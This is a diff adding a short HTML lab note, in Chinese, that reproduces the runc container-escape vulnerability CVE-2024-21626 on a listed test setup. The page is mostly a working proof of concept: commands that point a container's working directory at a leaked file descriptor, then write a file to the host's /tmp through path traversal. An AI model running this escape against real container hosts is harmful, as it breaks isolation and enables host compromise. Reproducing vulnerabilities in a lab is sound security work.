@@ -1,0 +1,37 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><script type="text/javascript" src="../page_head.js"></script>
+
+<h3><a href="../system.htm">系統</a> - Docker - Container Escape - <b>CVE-2024-21626</b></h3>
+<hr size="1"><br>
+<p>
+參考資訊：<br>
+https://nitroc.org/posts/cve-2024-21626-illustrated/#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E9%95%9C%E5%83%8F%E5%AE%9E%E7%8E%B0%E5%88%A9%E7%94%A8<br><br>
+
+<b>測試環境</b>：<br>
+Ubuntu: 20.04.6 LTS (Focal Fossa)<br>
+Kernel: 5.8.0-23-generic<br>
+Runc: 1.1.7-0ubuntu1~20.04.1<br>
+Docker: 20.10.25, build 20.10.25-0ubuntu1~20.04.2<br>
+Containerd: 1.7.2<br><br>
+
+<b>測試步驟</b>：
+</p>
+<pre>
+$ docker run --name helper-ctr alpine
+$ docker export helper-ctr --output alpine.tar
+$ mkdir rootfs
+$ tar xf alpine.tar -C rootfs
+$ runc spec
+$ sed -ri 's#(\s*"cwd": )"(/)"#\1 "/proc/self/fd/8"#g' config.json
+$ grep cwd config.json
+$ sudo runc --log ./log.json run demo
+
+# echo "test" &gt; ../../../tmp/cve-test
+# exit
+
+$ cat /tmp/cve-test 
+    test
+</pre>
+
+<br><script type="text/javascript" src="../tail.js"></script>
